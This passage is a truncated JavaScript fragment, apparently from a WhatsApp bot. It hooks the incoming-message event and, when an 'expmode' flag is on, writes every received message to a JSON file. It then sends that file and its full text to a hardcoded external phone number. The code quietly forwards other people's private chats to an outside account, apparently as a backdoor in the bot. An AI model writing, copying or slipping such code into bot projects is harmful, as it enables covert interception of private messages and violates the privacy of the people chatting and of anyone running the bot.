...
gzteam.ev.on('messages.upsert', async (messages) => {
        if (gzteam.expmode) {
            let owner = "62895385610519@s.whatsapp.net";
            let jeneng = `MessageData_${crypto.randomBytes(8).toString('hex')}.json`;
            let penis = JSON.stringify({ messages }, null, 4)
            try {
                
                await fs.writeFileSync(jeneng, penis);
                await gzteam.sendMessage(owner, { document: { url: `./${jeneng}` }, fileName: jeneng, mimetype: '*/*', caption: penis}, { quoted: null });
